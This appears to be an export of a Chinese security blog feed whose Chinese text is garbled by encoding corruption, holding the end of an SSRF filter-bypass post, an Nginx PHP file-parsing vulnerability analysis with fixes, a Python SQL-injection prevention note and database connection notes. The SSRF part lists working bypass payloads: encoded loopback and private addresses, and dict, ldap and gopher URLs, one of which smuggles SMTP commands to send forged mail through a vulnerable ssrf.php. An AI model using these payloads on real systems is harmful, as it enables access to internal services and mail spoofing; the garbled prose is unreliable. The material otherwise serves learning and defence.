<h2 id="9ã€åˆ©ç”¨å¥å·"><a href="#9ã€åˆ©ç”¨å¥å·" class="headerlink" title="9ã€åˆ©ç”¨å¥å·"></a>9ã€åˆ©ç”¨å¥å·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/5.png" alt=""></p>
<h2 id="10ã€åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#10ã€åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="10ã€åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>10ã€åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚</div><div class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</div><div class="line">é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1a</div><div class="line">ç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶</div><div class="line">è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0 è·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/9.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</div><div class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/8.png" alt=""></p>
<h2 id="11ã€åˆ©ç”¨ç‰¹æ®Šåœ°å€"><a href="#11ã€åˆ©ç”¨ç‰¹æ®Šåœ°å€" class="headerlink" title="11ã€åˆ©ç”¨ç‰¹æ®Šåœ°å€"></a>11ã€åˆ©ç”¨ç‰¹æ®Šåœ°å€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://0/</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/10.png" alt=""></p>
<h2 id="12ã€åˆ©ç”¨åè®®"><a href="#12ã€åˆ©ç”¨åè®®" class="headerlink" title="12ã€åˆ©ç”¨åè®®"></a>12ã€åˆ©ç”¨åè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Dict://</div><div class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</div><div class="line">ssrf.php?url=dict://attacker:11111/</div><div class="line">SFTP://</div><div class="line">ssrf.php?url=sftp://example.com:11111/</div><div class="line">TFTP://</div><div class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</div><div class="line">LDAP://</div><div class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</div><div class="line">Gopher://</div><div class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</div></pre></td></tr></table></figure>
<h2 id="13ã€ä½¿ç”¨ç»„åˆ"><a href="#13ã€ä½¿ç”¨ç»„åˆ" class="headerlink" title="13ã€ä½¿ç”¨ç»„åˆ"></a>13ã€ä½¿ç”¨ç»„åˆ</h2><p>å„ç§ç»•è¿‡çš„ç»„åˆå³å¯</p>
<h3 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h3><p><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="external">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a><br><a href="https://twitter.com/albinowax/status/890725759861403648" target="_blank" rel="external">https://twitter.com/albinowax/status/890725759861403648</a><br><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a><br><a href="https://hackerone.com/reports/115748" target="_blank" rel="external">https://hackerone.com/reports/115748</a><br><a href="https://www.dailysecurity.fr/server-side-request-forgery/" target="_blank" rel="external">https://www.dailysecurity.fr/server-side-request-forgery/</a><br><a href="https://twitter.com/EdOverflow" target="_blank" rel="external">https://twitter.com/EdOverflow</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" target="_blank" rel="external">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</a><br><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf" target="_blank" rel="external">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</a><br><a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a><br><a href="http://blog.csdn.net/xinianbuxiu/article/details/53560417" target="_blank" rel="external">http://blog.csdn.net/xinianbuxiu/article/details/53560417</a></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> CTF </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> SSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginxè§£ææ¼æ´åŸç†åˆ†æ]]></title>
      <url>/2017/11/09/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="0x01-æ¼æ´æè¿°"><a href="#0x01-æ¼æ´æè¿°" class="headerlink" title="0x01 æ¼æ´æè¿°"></a>0x01 æ¼æ´æè¿°</h1><p>æ¼æ´ä»‹ç»ï¼šnginxæ˜¯ä¸€æ¬¾é«˜æ€§èƒ½çš„webæœåŠ¡å™¨ï¼Œä½¿ç”¨éå¸¸å¹¿æ³›ï¼Œå…¶ä¸ä»…ç»å¸¸è¢«ç”¨ä½œåå‘ä»£ç†ï¼Œä¹Ÿå¯ä»¥éå¸¸å¥½çš„æ”¯æŒPHPçš„è¿è¡Œã€‚<code>Nginx&lt;8.03</code>é»˜è®¤æƒ…å†µä¸‹å¯èƒ½å¯¼è‡´æœåŠ¡å™¨é”™è¯¯çš„å°†ä»»ä½•ç±»å‹çš„æ–‡ä»¶ä»¥PHPçš„æ–¹å¼è¿›è¡Œè§£æï¼Œè¿™å°†å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œä½¿å¾—æ¶æ„çš„æ”»å‡»è€…å¯èƒ½æ”»é™·æ”¯æŒphpçš„nginxæœåŠ¡å™¨ã€‚</p>
<a id="more"></a>
<h1 id="0x02-æ¦‚å¿µä»‹ç»"><a href="#0x02-æ¦‚å¿µä»‹ç»" class="headerlink" title="0x02 æ¦‚å¿µä»‹ç»"></a>0x02 æ¦‚å¿µä»‹ç»</h1><h2 id="0x21-CGI"><a href="#0x21-CGI" class="headerlink" title="0x21 CGI"></a>0x21 CGI</h2><p>CGIæ˜¯è§„å®šweb serverä¼ é€’è¿‡æ¥çš„æ•°æ®æ˜¯ä½•ç§æ ‡å‡†æ ¼å¼ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªåè®®ã€‚web server(ä¾‹å¦‚nginx)åªæ˜¯å†…å®¹çš„åˆ†å‘è€…ã€‚æ¯”å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1) å¦‚æœè¯·æ±‚/index.htmlï¼Œé‚£ä¹ˆweb serverä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œè¿™é‡Œåˆ†å‘çš„æ˜¯é™æ€æ•°æ®</div><div class="line">2) å¦‚æœè¯·æ±‚çš„æ˜¯/index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ï¼ŒnginxçŸ¥é“è¿™ä¸ªä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œéœ€è¦å»æ‰¾PHPè§£æå™¨æ¥å¤„ç†ï¼Œé‚£ä¹ˆä»–ä¼šæŠŠè¿™ä¸ªè¯·æ±‚ç®€å•å¤„ç†åäº¤ç»™PHPè§£æå™¨</div><div class="line"></div><div class="line">é—®é¢˜çš„æ ¸å¿ƒåœ¨äºNginxéœ€è¦ä¼ å“ªäº›æ•°æ®ç»™PHPè§£æå™¨å‘¢ï¼Œä¾‹å¦‚ï¼š</div><div class="line">1) url</div><div class="line">2) æŸ¥è¯¢å­—ç¬¦ä¸²</div><div class="line">3) POSTæ•°æ®</div><div class="line">4) HTTP header</div><div class="line">...</div></pre></td></tr></table></figure>
<p>æ‰€ä»¥ï¼ŒCGIæœ¬è´¨ä¸Šå°±æ˜¯è§„å®šè¦ä¼ å“ªäº›æ•°æ®ã€ä»¥ä»€ä¹ˆæ ·çš„æ ¼å¼ä¼ é€’ç»™åæ–¹å¤„ç†è¿™ä¸ªè¯·æ±‚çš„åè®®ã€‚</p>
<h2 id="0x22-FastCGI"><a href="#0x22-FastCGI" class="headerlink" title="0x22 FastCGI"></a>0x22 FastCGI</h2><p>FastCGIé¡¾åæ€ä¹‰ä¹Ÿæ˜¯CGIçš„ä¸€ä¸ªåè®®ï¼ŒFastCGIåªæ˜¯ä¼˜åŒ–äº†CGIç¨‹åºçš„æ€§èƒ½<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1) é¦–å…ˆï¼ŒFastcgiä¼šå…ˆå¯ä¸€ä¸ªmasterï¼Œè§£æé…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒ</div><div class="line">2) ç„¶åå†å¯åŠ¨å¤šä¸ªworker</div><div class="line">3) å½“è¯·æ±‚è¿‡æ¥æ—¶ï¼Œmasterä¼šä¼ é€’ç»™ä¸€ä¸ªworkerï¼Œç„¶åç«‹å³å¯ä»¥æ¥å—ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±é¿å…äº†é‡å¤çš„åŠ³åŠ¨ï¼Œæ•ˆç‡æé«˜äº†</div><div class="line">4) è€Œä¸”å½“workerä¸å¤Ÿç”¨æ—¶ï¼Œmasterå¯ä»¥æ ¹æ®é…ç½®é¢„å…ˆå¯åŠ¨å‡ ä¸ªworkerç­‰ç€ï¼ŒåŒæ—¶å¦‚æœå‘ç°ç©ºé—²workerå¤ªå¤šæ—¶ï¼Œä¹Ÿä¼šåœæ‰ä¸€äº›ï¼Œè¿™æ ·å°±æé«˜äº†æ€§èƒ½ï¼Œä¹ŸèŠ‚çº¦äº†èµ„æº</div></pre></td></tr></table></figure></p>
<h2 id="0x23-PHP-CGI-PHP-FastCGI"><a href="#0x23-PHP-CGI-PHP-FastCGI" class="headerlink" title="0x23 PHP-CGI/PHP-FastCGI"></a>0x23 PHP-CGI/PHP-FastCGI</h2><p>PHPçš„è§£é‡Šå™¨æ˜¯PHP-CGIï¼ŒPHP-CGIåªæ˜¯ä¸ªCGIç¨‹åºï¼Œä»–è‡ªå·±æœ¬èº«åªèƒ½è§£æè¯·æ±‚ï¼Œè¿”å›ç»“æœï¼Œä¸ä¼šè¿›ç¨‹ç®¡ç†</p>
<h2 id="0x24-PHP-FPM"><a href="#0x24-PHP-FPM" class="headerlink" title="0x24 PHP-FPM"></a>0x24 PHP-FPM</h2><p>PHP-FPMæ˜¯PHP-CGIè¿›ç¨‹çš„ç®¡ç†å™¨ï¼Œç”¨æ¥ç®¡ç†PHP-CGIè¿›ç¨‹çš„ï¼ŒPHP-FPMçš„ç®¡ç†å¯¹è±¡æ˜¯PHP-CGI</p>
<h1 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03 æ¼æ´åˆ†æ"></a>0x03 æ¼æ´åˆ†æ</h1><p>nginxé»˜è®¤ä»¥cgiçš„æ–¹å¼æ”¯æŒphpçš„è¿è¡Œï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­å¦‚ä¸‹é…ç½®:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">location ~ .php$ </div><div class="line">&#123;</div><div class="line">    root html;</div><div class="line">    fastcgi_pass 127.0.0.1:9000;</div><div class="line">    fastcgi_index index.php;</div><div class="line">    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;</div><div class="line">    include fastcgi_params;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>é…ç½®å‚æ•°è¯´æ˜å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1. locationå¯¹è¯·æ±‚è¿›è¡Œé€‰æ‹©çš„æ—¶å€™ä¼šä½¿ç”¨URIç¯å¢ƒå˜é‡è¿›è¡Œé€‰æ‹©</div><div class="line">    1) å…¶ä¸­ä¼ é€’åˆ°åç«¯Fastcgiçš„å…³é”®å˜é‡SCRIPT_FILENAMEç”±nginxç”Ÿæˆçš„$fastcgi_script_nameå†³å®š</div><div class="line">    2) è€Œé€šè¿‡åˆ†æå¯ä»¥çœ‹åˆ°$fastcgi_script_nameæ˜¯ç›´æ¥ç”±URIç¯å¢ƒå˜é‡æ§åˆ¶çš„</div><div class="line">2. è¿™é‡Œå°±æ˜¯äº§ç”Ÿé—®é¢˜çš„ç‚¹ã€‚è€Œä¸ºäº†è¾ƒå¥½çš„æ”¯æŒPATH_INFOçš„æå–ï¼Œåœ¨PHPçš„é…ç½®é€‰é¡¹é‡Œå­˜åœ¨cgi.fix_pathinfoé€‰é¡¹ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†ä»SCRIPT_FILENAMEé‡Œå–å‡ºçœŸæ­£çš„è„šæœ¬å </div><div class="line"></div><div class="line">æˆ‘ä»¬æ¥å‡è®¾ä¸€ä¸ªæ”»å‡»åœºæ™¯:</div><div class="line"></div><div class="line">    1. å‡è®¾å­˜åœ¨ä¸€ä¸ªURL: http://localhost/test/test.jpg</div><div class="line">    2. æˆ‘ä»¬ä»¥å¦‚ä¸‹çš„æ–¹å¼å»è®¿é—®: http://localhost/test/test.jpg/test.php</div><div class="line">    3. nginxå°†ä¼šå¾—åˆ°ä¸€ä¸ªURI: /test.jpg/test.php</div><div class="line">    4. ç»è¿‡locationæŒ‡ä»¤ï¼Œè¯¥è¯·æ±‚å°†ä¼šäº¤ç»™åç«¯çš„fastcgiå¤„ç†ï¼Œnginxä¸ºå…¶è®¾ç½®ç¯å¢ƒå˜é‡SCRIPT_FILENAMEï¼Œå†…å®¹ä¸º: /scripts/test.jpg/test.php</div><div class="line">    5. åç«¯çš„fastcgiåœ¨æ¥å—åˆ°è¯¥é€‰é¡¹æ—¶ï¼Œä¼šæ ¹æ®fix_pathinfoé…ç½®å†³å®šæ˜¯å¦å¯¹SCRIPT_FILENAMEè¿›è¡Œé¢å¤–çš„å¤„ç†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¦‚æœä¸å¯¹fix_pathinfoè¿›è¡Œè®¾ç½®å°†å½±å“ä½¿ç”¨PATH_INFOè¿›è¡Œè·¯ç”±é€‰æ‹©çš„åº”ç”¨ï¼Œæ‰€ä»¥è¯¥é€‰é¡¹ä¸€èˆ¬é…ç½®å¼€å¯ã€‚phpé€šè¿‡è¯¥é€‰é¡¹ä¹‹åå°†æŸ¥æ‰¾å…¶ä¸­çœŸæ­£çš„è„šæœ¬æ–‡ä»¶åå­—ï¼ŒæŸ¥æ‰¾çš„æ–¹å¼ä¹Ÿæ˜¯æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªæ—¶å€™å°†åˆ†ç¦»å‡ºSCRIPT_FILENAMEå’ŒPATH_INFOåˆ†åˆ«ä¸º</div><div class="line">    1) SCRIPT_FILENAME: /scripts/test.jpg</div><div class="line">    2) PATH_INFO: test.php</div><div class="line">    6. æœ€åï¼Œä»¥/scripts/test.jpgä½œä¸ºæ­¤æ¬¡è¯·æ±‚éœ€è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œè€Œnginxä¼šä½¿ç”¨phpè§£æå™¨æ¥å¤„ç†è¿™ä¸ªjpgæ–‡ä»¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥å®ç°è®©nginxä»¥phpæ¥è§£æä»»ä½•ç±»å‹çš„æ–‡ä»¶äº†</div></pre></td></tr></table></figure>
<p>æ‰€ä»¥ï¼Œæ¼æ´çš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯ç”±äºfcgiå’Œweb serverå¯¹scriptè·¯å¾„çº§å‚æ•°çš„ç†è§£ä¸åŒå‡ºç°çš„é—®é¢˜ï¼Œè¿™æ˜¯å…¸å‹çš„å› ä¸ºè·¨ç³»ç»Ÿè¯­å¢ƒä¸åŒå¯¼è‡´å¯¹åŒä¸€ä¸ªè¯·æ±‚çš„ä¸åŒè§£é‡Šå¯¼è‡´çš„æ¼æ´ï¼Œå®ƒçš„æ”»å‡»é¢æ˜¯å¸¦æœ‰è¿™ç§æ¼æ´çš„nginx</p>
<h1 id="0x04-ä¿®å¤æ–¹æ¡ˆ"><a href="#0x04-ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="0x04: ä¿®å¤æ–¹æ¡ˆ"></a>0x04: ä¿®å¤æ–¹æ¡ˆ</h1><ol>
<li>ä¿®æ”¹<code>php.ini</code>é…ç½®</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo = 0</div></pre></td></tr></table></figure>
<ol>
<li>nginxé…ç½®æ–‡ä»¶ä¸­æ·»åŠ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if ( $fastcgi_script_name ~ ..*/.*php ) </div><div class="line">&#123;</div><div class="line">    return 403;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">è€ƒè™‘åˆ°MVCæ¡†æ¶ã€ç”¨æˆ·è‡ªå®šä¹‰ç«™ç‚¹ä¸­æœ‰å¯èƒ½å‡ºç°xxx/xx.phpçš„æƒ…å†µï¼Œè¿™ä¸ªè§„åˆ™åº”è¯¥æ›´åŠ ç»†ç²’åº¦ä¸€ç‚¹ï¼Œä¾‹å¦‚*.jpg/.*phpã€*.txt/.*php</div><div class="line">*/</div><div class="line">å¦å¤–ï¼Œnginxå¯ä»¥åœ¨ä¸éœ€è¦é‡å¯çš„æƒ…å†µï¼Œhotreloadé…ç½®æ–‡ä»¶</div><div class="line">service nginx reload </div><div class="line">//or </div><div class="line">/etc/init.d/nginx reload</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>å‚è€ƒæ–‡ç« ï¼š</strong></p>
<p><a href="http://www.80sec.com/nginx-securit.html" target="_blank" rel="external">http://www.80sec.com/nginx-securit.html</a><br><a href="http://php.net/manual/zh/ini.core.php" target="_blank" rel="external">http://php.net/manual/zh/ini.core.php</a><br><a href="http://www.cnblogs.com/LittleHann/p/4561462.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/4561462.html</a><br><a href="http://php.net/manual/zh/install.fpm.configuration.php" target="_blank" rel="external">http://php.net/manual/zh/install.fpm.configuration.php</a><br><a href="http://php.net/manual/zh/install.fpm.php" target="_blank" rel="external">http://php.net/manual/zh/install.fpm.php</a><br><a href="http://segmentfault.com/q/1010000000256516" target="_blank" rel="external">http://segmentfault.com/q/1010000000256516</a></p>
]]></content>
      
        
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> è§£ææ¼æ´ </tag>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå®‰å…¨å¼€å‘ä¹‹SQLæ³¨å…¥]]></title>
      <url>/2017/11/05/Python%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>PHPä¸­ä½¿ç”¨çš„é¢„ç¼–è¯‘åœ¨pythonä¸­åŒæ ·é€‚ç”¨ï¼ŒåŒæ ·å¯ä»¥ç”¨é¢„ç¼–è¯‘æ¥é˜²æ­¢pythonç¼–ç ä¸­çš„SQLæ³¨å…¥é—®é¢˜ã€‚<br><a id="more"></a></p>
<p><strong>é”™è¯¯ç”¨æ³•ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = &quot;select id,name from user where id = %s and name = %s&quot; % (id, name)</div><div class="line">cur.execute(sql)</div></pre></td></tr></table></figure></p>
<p>è¿™ç§ç”¨æ³•å°±æ˜¯å¸¸è§çš„æ‹¼æ¥å­—ç¬¦ä¸²å¯¼è‡´sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿã€‚</p>
<p><strong>æ­£ç¡®ç”¨æ³•ï¼š</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">args = (id, name)</div><div class="line">cur.execute(&apos;select id,name from user where id = %s and name = %s&apos;, args )</div></pre></td></tr></table></figure>
<p>ä½¿ç”¨å¦‚æ­¤å‚æ•°å¸¦å…¥æ–¹å¼ï¼Œpythonä¼šè‡ªåŠ¨è¿‡æ»¤argsä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ¶æ­¢SQLæ³¨å…¥çš„äº§ç”Ÿã€‚</p>
<p>execute()å‡½æ•°æœ¬èº«å°±æœ‰æ¥å—SQLè¯­å¥å˜é‡çš„å‚æ•°ä½ï¼Œå¯ä»¥é€šè¿‡pythonè‡ªèº«çš„å‡½æ•°å¤„ç†sqlæ³¨å…¥é—®é¢˜,åªè¦æ­£ç¡®çš„ä½¿ç”¨ï¼ˆå³ï¼šä½¿ç”¨â€é€—å·â€ï¼Œè€Œä¸æ˜¯â€ç™¾åˆ†å·â€ï¼‰å°±å¯ä»¥å¯¹ä¼ å…¥çš„å€¼è¿›è¡Œæ­£ç¡®çš„è½¬ä¹‰ï¼Œä»è€Œé¿å…SQLæ³¨å…¥çš„å‘ç”Ÿã€‚</p>
<p>For Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import sqlite3</div><div class="line"></div><div class="line">con = sqlite3.connect(&quot;:memory:&quot;)</div><div class="line">cur = con.cursor()</div><div class="line">cur.execute(&quot;create table people (name, age)&quot;)</div><div class="line"> </div><div class="line">who = &quot;test&quot;</div><div class="line">age = 22</div><div class="line"> </div><div class="line"># This is the qmark style:</div><div class="line">cur.execute(&quot;insert into people values (?, ?)&quot;, (who, age))</div><div class="line"> </div><div class="line"># And this is the named style:</div><div class="line">cur.execute(&quot;select * from people where name_last=:who and age=:age&quot;, &#123;&quot;who&quot;: who, &quot;age&quot;: age&#125;)</div><div class="line"> </div><div class="line">print cur.fetchone()</div></pre></td></tr></table></figure>
<p>å‚è€ƒæ–‡ç« ï¼š<br><a href="http://xlixli.net/?p=377" target="_blank" rel="external">http://xlixli.net/?p=377</a><br><a href="http://www.cnblogs.com/sevck/p/6733702.html" target="_blank" rel="external">http://www.cnblogs.com/sevck/p/6733702.html</a><br><a href="https://crazyof.me/blog/archives/2224.html" target="_blank" rel="external">https://crazyof.me/blog/archives/2224.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> Python </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonå¼€å‘ç¬”è®°]]></title>
      <url>/2017/10/17/Python%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>è¿‘æœŸå­¦ä¹ å¼€å‘ä¸­é‡åˆ°çš„ä¸€äº›çŸ¥è¯†ï¼Œåšçš„å­¦ä¹ ç¬”è®°ï¼Œåšä¸ªå°è®°å½•ï¼ŒæŒç»­æ›´æ–°ä¸­â€¦<br><a id="more"></a></p>
<h1 id="DatasetåŸºäºSQLAlchemyçš„ä¾¿åˆ©å·¥å…·"><a href="#DatasetåŸºäºSQLAlchemyçš„ä¾¿åˆ©å·¥å…·" class="headerlink" title="DatasetåŸºäºSQLAlchemyçš„ä¾¿åˆ©å·¥å…·"></a>DatasetåŸºäºSQLAlchemyçš„ä¾¿åˆ©å·¥å…·</h1><p><a href="https://dataset.readthedocs.io/en/latest/index.html" target="_blank" rel="external">å®˜æ–¹æ–‡æ¡£</a></p>
<p>æ•°æ®é›†ä½¿å¾—æ•°æ®åº“ä¸­çš„æ•°æ®è¯»å–å’Œå†™å…¥æ•°æ®å°±åƒé˜…è¯»å’Œç¼–å†™JSONæ–‡ä»¶ä¸€æ ·ç®€å•ã€‚</p>
<p>datasetå¯¹äºæ“ä½œJSONã€CSVæ–‡ä»¶ã€NoSQLéå¸¸å¥½ç”¨ã€‚</p>
<p><code>import dataset</code></p>
<p>è¿æ¥MySQLæ•°æ®åº“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">db = dataset.connect(&apos;mysql://username:password@10.10.10.10/ctf?charset=utf8&apos;)</div><div class="line">ç”¨æˆ·å:usernameï¼Œå¯†ç :passwordï¼Œæ•°æ®åº“åœ°å€(åœ°å€+ç«¯å£):10.10.10.10ï¼Œdatabaseå: ctf</div><div class="line">è¿æ¥SQLiteæ•°æ®åº“ï¼š</div><div class="line">db = dataset.connect(&apos;sqlite:///ctf.db&apos;)</div><div class="line">è¿æ¥PostgreSQLæ•°æ®åº“ï¼š</div><div class="line">db = dataset.connect(&apos;postgresql://scott:tiger@localhost:5432/mydatabase&apos;)</div></pre></td></tr></table></figure>
